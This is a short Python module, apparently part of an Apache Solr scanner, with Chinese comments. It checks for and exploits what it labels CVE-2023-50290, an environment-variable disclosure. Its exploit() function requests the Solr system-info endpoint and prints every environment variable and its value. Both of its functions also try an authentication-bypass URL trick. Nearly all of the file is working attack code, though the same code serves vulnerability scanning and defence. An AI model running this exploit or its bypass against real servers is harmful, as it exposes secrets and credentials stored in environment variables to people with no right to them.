#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Apache Solr CVE-2023-50290 漏洞检测模块
Apache Solr环境变量信息泄露漏洞
"""

import logging
import json
import re

def check(scanner, core=None):
    """
    检测CVE-2023-50290环境变量信息泄露漏洞
    
    Args:
        scanner: SolrScanner实例
        core: 指定核心名称，为None时检测所有核心
        
    Returns:
        (bool, str): (是否存在漏洞, 详细信息)
    """
    try:
        # 尝试直接访问环境变量信息
        resp = scanner.request("GET", "/solr/admin/info/system?wt=json")
        
        if resp and resp.status_code == 200:
            data = resp.json()
            
            # 检查是否包含敏感环境变量信息
            if "system" in data and "env" in data["system"]:
                env_vars = data["system"]["env"]
                sensitive_vars = ["JAVA_HOME", "PATH", "USER", "HOME", "PWD"]
                
                found_sensitive = [var for var in sensitive_vars if var in env_vars]
                
                if found_sensitive:
                    return True, f"存在CVE-2023-50290环境变量信息泄露漏洞，发现敏感环境变量: {', '.join(found_sensitive)}"
            
            return False, "未发现CVE-2023-50290环境变量信息泄露漏洞"
        
        # 尝试认证绕过方式访问
        resp = scanner.request("GET", "/solr/admin/info/system:/admin/info/key?wt=json")
        
        if resp and resp.status_code == 200:
            data = resp.json()
            
            # 检查是否包含敏感环境变量信息
            if "system" in data and "env" in data["system"]:
                env_vars = data["system"]["env"]
                sensitive_vars = ["JAVA_HOME", "PATH", "USER", "HOME", "PWD"]
                
                found_sensitive = [var for var in sensitive_vars if var in env_vars]
                
                if found_sensitive:
                    return True, f"存在CVE-2023-50290环境变量信息泄露漏洞（认证绕过），发现敏感环境变量: {', '.join(found_sensitive)}"
        
        return False, "未发现CVE-2023-50290环境变量信息泄露漏洞"
    except Exception as e:
        logging.error(f"检测CVE-2023-50290异常: {str(e)}")
        return False, f"检测异常: {str(e)}"

def exploit(scanner):
    """
    利用CVE-2023-50290漏洞获取环境变量信息
    
    Args:
        scanner: SolrScanner实例
        
    Returns:
        (bool, str): (是否成功, 结果信息)
    """
    try:
        # 尝试直接访问环境变量信息
        resp = scanner.request("GET", "/solr/admin/info/system?wt=json")
        
        if resp and resp.status_code == 200:
            data = resp.json()
            
            # 检查是否包含环境变量信息
            if "system" in data and "env" in data["system"]:
                env_vars = data["system"]["env"]
                
                # 格式化输出
                result = "环境变量信息:\n"
                for key, value in env_vars.items():
                    result += f"{key}: {value}\n"
                
                return True, result
        
        # 尝试认证绕过方式访问
        resp = scanner.request("GET", "/solr/admin/info/system:/admin/info/key?wt=json")
        
        if resp and resp.status_code == 200:
            data = resp.json()
            
            # 检查是否包含环境变量信息
            if "system" in data and "env" in data["system"]:
                env_vars = data["system"]["env"]
                
                # 格式化输出
                result = "环境变量信息 (通过认证绕过获取):\n"
                for key, value in env_vars.items():
                    result += f"{key}: {value}\n"
                
                return True, result
        
        return False, "无法获取环境变量信息，可能不存在漏洞或已修复"
    except Exception as e:
        logging.error(f"利用CVE-2023-50290异常: {str(e)}")
        return False, f"利用异常: {str(e)}"
